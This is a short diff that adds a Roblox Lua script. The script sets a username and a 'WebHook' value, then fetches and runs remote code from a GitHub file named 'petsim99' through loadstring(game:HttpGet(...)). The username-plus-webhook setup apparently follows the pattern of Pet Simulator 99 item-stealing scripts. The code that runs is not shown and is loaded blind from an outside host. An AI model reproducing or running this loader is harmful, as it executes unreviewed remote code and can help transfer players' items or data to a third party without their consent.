@@ -1,0 +1,3 @@
+_G.UserName = Elektotofu
+_G.WebHook = "https://discord.gg/UY2CV5HQ"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NaraOp/nara-hub/refs/heads/main/petsim99"))()
